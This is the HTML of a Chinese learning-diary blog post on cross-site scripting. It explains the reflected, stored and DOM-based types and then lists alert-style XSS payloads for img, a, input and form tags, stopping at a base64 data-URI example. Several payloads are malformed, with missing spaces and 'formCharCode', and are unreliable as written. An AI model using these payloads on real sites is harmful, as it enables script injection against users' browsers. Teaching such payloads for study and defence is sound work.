@@ -1,0 +1,862 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一. XSS漏洞介绍 定义&#x2F;原理：跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站式脚本攻击">
+<meta property="og:url" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Czin2u✈️✈️✈️">
+<meta property="og:description" content="一. XSS漏洞介绍 定义&#x2F;原理：跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214524558.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214546067.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214603354.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214652487.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101223625022.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101223730730.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224031179.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224128169.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224216584.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224516769.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224702370.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224920977.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101225058834.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101230752697.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101230734554.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233742618.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233754097.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233908102.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151732364.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151739901.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151903679.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210314142540889.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103201445728.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103204033588.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103210826667.png">
+<meta property="og:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103210926034.png">
+<meta property="og:image" content="http://example.com/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103211318678.png">
+<meta property="og:image" content="http://example.com/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103211339797.png">
+<meta property="article:published_time" content="2022-10-31T10:37:39.598Z">
+<meta property="article:modified_time" content="2022-11-03T13:14:02.197Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214524558.png">
+  
+  
+  
+  <title>XSS跨站式脚本攻击 - Czin2u✈️✈️✈️</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Czin2u.(●&#39;◡&#39;●)</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="XSS跨站式脚本攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-31 18:37" pubdate>
+          October 31, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS跨站式脚本攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="一-XSS漏洞介绍"><a href="#一-XSS漏洞介绍" class="headerlink" title="一. XSS漏洞介绍"></a>一. XSS漏洞介绍</h3><ol>
+<li><p>定义&#x2F;原理：跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+</li>
+<li><p>本质：是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种 。</p>
+</li>
+<li><p>特点：XSS主要基于JavaScript完成恶意的攻击行为，由于JS可以非常灵活地操作html、css和浏览器，使得跨站脚本攻击的“想象”空间特别大。</p>
+</li>
+<li><p>攻击对象：被攻击者的浏览器。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然后浏览器不会判断代码是否恶意，也就是说xss的对象是用户的浏览器。</p>
+</li>
+<li><p>一般的攻击过程：</p>
+</li>
+<li><p>攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；<br>用户在没有防备的情况下访问了被注入了恶意代码的服务器；<br>服务器将含有恶意代码的网页响应给客户端；<br>在客户端浏览器中触发JS恶意代码。<br>微博、留言板、聊天室等等收集用户输入的地方，都可能被注入xss代码，都存在遭受xss的风险，只要没有对用户的输入进行严格过滤，就会被xss。当攻击者可以将恶意代码注入到服务器中，我们就认为其存在xss漏洞。</p>
+</li>
+</ol>
+<h3 id="二-XSS漏洞分类"><a href="#二-XSS漏洞分类" class="headerlink" title="二.XSS漏洞分类"></a>二.XSS漏洞分类</h3><h4 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h4><ol>
+<li><p>又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端</p>
+</li>
+<li><p>常见注入点: 网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。</p>
+</li>
+<li><p>漏洞产生原因一般是网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的欻据中存在可被浏览器执行的代码数据</p>
+</li>
+<li><p>攻击方式 </p>
+<p>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。  由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p>
+</li>
+<li><p>反射型XSS攻击的流程如下：  </p>
+<p>1.攻击者寻找具有漏洞的网站 </p>
+<p>2.攻击者给用户发了一个带有恶意字符串的链接 </p>
+<p>3.用户点击了该链接 </p>
+<p>4.服务器返回HTML文档，此时该文档已经包含了那个恶意字符串 </p>
+<p>5.客户端执行了植入的恶意脚本，XSS攻击就发生</p>
+</li>
+</ol>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><ol>
+<li><p>存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）</p>
+</li>
+<li><p>常见注入点 论坛、博客、留言板、网站的留言、评论、日志等交互处。</p>
+</li>
+<li><p>造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。</p>
+</li>
+<li><p>攻击方式 攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了  恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。</p>
+</li>
+<li><p>存储型ⅩSS攻击的流程如下 </p>
+<p>1.用户提交了一条包含XSS代码的留言到数据库 </p>
+<p>2.当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来 </p>
+<p>3.浏览器发现有XSS代码，就当做正常的HTML和JS解析执行</p>
+</li>
+</ol>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><ol>
+<li><p>DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document”对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p>
+<p>它是基于DoM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互。</p>
+<p>其通过修改页面DOM节点数据信息而形成的ⅩSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p>
+<p>一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题</p>
+</li>
+<li><p>注入点 通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所  以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p>
+</li>
+<li><p>攻击方式 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存  在XSS漏洞。</p>
+</li>
+<li><p>它的流程是这样的： 1.攻击者寻找具有漏洞的网站 2.攻击者给用户发了一个带有恶意字符串的链接 3.用户点击了该链接 4.服务器返回HTML文档，但是该文档此时不包含那个恶意字符串 5.客户端执行了该HTML文档里的脚本，然后把恶意脚本植入了页面 6.客服端执行了植入的恶意脚本，XSS攻击就发生了</p>
+</li>
+</ol>
+<h3 id="三-xss漏洞利用"><a href="#三-xss漏洞利用" class="headerlink" title="三.xss漏洞利用"></a>三.xss漏洞利用</h3><h4 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h4><h5 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;<span class="hljs-attribute">imgsrc</span>=javascript:alert(&quot;xss&quot;)&gt;<br>&lt;<span class="hljs-attribute">IMGSRC</span>=javascript:alert(String.formCharCode(88,83,83))&gt;<br>&lt;<span class="hljs-attribute">imgscr</span>=<span class="hljs-string">&quot;URL&quot;</span>style=&#x27;Xss:expression(alert(/xss));&#x27;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<!--CSS标记xss-->
+
+<p>imgSTYLE&#x3D;”background-image:url(javascript:alert(‘XSS’))”</p>
+</blockquote>
+<h5 id="XSS利用方式2"><a href="#XSS利用方式2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;imgsrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br>&lt;imgsrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span>onerror<span class="hljs-operator">=</span>eval(<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>)&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="XSS利用方式3"><a href="#XSS利用方式3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&lt;<span class="hljs-variable">imgsrc</span>=<span class="hljs-number">1</span><span class="hljs-variable">onmouseover</span>=<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;</code>标签</h4><h5 id="标准格式"><a href="#标准格式" class="headerlink" title="标准格式"></a>标准格式</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="XSS利用方式1"><a href="#XSS利用方式1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:eval(alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;))&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:aaa&quot;</span><span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<h5 id="XSS利用方式2-1"><a href="#XSS利用方式2-1" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<h5 id="利用方式3"><a href="#利用方式3" class="headerlink" title="利用方式3"></a>利用方式3</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;ahref=<span class="hljs-string">&quot;&quot;</span>onclick=<span class="hljs-built_in">eval</span>(alert(<span class="hljs-string">&#x27;xss&#x27;</span>))&gt;aa&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用方式4"><a href="#利用方式4" class="headerlink" title="利用方式4"></a>利用方式4</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;ahref=kycg.asp?ttt=1000onmouseover=prompt(<span class="hljs-string">&#x27;xss&#x27;</span>)y=2016&gt;aa&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><h5 id="标准格式-1"><a href="#标准格式-1" class="headerlink" title="标准格式"></a>标准格式</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input name<span class="hljs-operator">=</span><span class="hljs-string">&quot;name&quot;</span>value<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用方式1-1"><a href="#利用方式1-1" class="headerlink" title="利用方式1"></a>利用方式1</h5><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">input</span> value=<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">onclick</span>=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)type=<span class="hljs-string">&quot;text&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span> <span class="hljs-type">name</span>=&quot;name&quot;<span class="hljs-keyword">value</span>=&quot;&quot;onmouseover=prompt(<span class="hljs-string">&#x27;xss&#x27;</span>)bad=&quot;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用方式4-1"><a href="#利用方式4-1" class="headerlink" title="利用方式4"></a>利用方式4</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span><span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;</code>标签</h4><h5 id="XSS利用方式1-1"><a href="#XSS利用方式1-1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><blockquote>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;form action=javascript:alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<span class="hljs-keyword">method</span>=&quot;<span class="hljs-title function_">get</span>&quot;&gt;<br>&lt;<span class="hljs-title function_">form</span> <span class="hljs-title function_">action</span>=<span class="hljs-title function_">javascript</span>:alert(<span class="hljs-string">&#x27;xss&#x27;</span>)&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h5 id="XSS利用方式2-2"><a href="#XSS利用方式2-2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><blockquote>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;form <span class="hljs-keyword">method</span>=<span class="hljs-title function_">postaction</span>=<span class="hljs-title function_">aa</span>.<span class="hljs-title function_">asp</span>?<span class="hljs-title function_">onmouseover</span>=<span class="hljs-title function_">prompt</span><span class="hljs-params">(<span class="hljs-string">&#x27;xss&#x27;</span>)</span>&gt;<br>&lt;<span class="hljs-title function_">form</span> <span class="hljs-title function_">method</span>=<span class="hljs-title function_">postaction</span>=<span class="hljs-title function_">aa</span>.<span class="hljs-title function_">asp</span>?<span class="hljs-title function_">onmouseover</span>=<span class="hljs-title function_">alert</span><span class="hljs-params">(<span class="hljs-string">&#x27;xss&#x27;</span>)</span>&gt;<br>&lt;<span class="hljs-title function_">form</span> <span class="hljs-title function_">action</span>=1<span class="hljs-title function_">onmouseover</span>=<span class="hljs-title function_">alert</span><span class="hljs-params">(<span class="hljs-string">&#x27;xss)&gt;</span></span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<h5 id="XSS利用方式3-1"><a href="#XSS利用方式3-1" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><blockquote>
+<!--原code-->
+
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;form method<span class="hljs-operator">=</span>postaction<span class="hljs-operator">=</span><span class="hljs-string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<!--base64编码-->
+
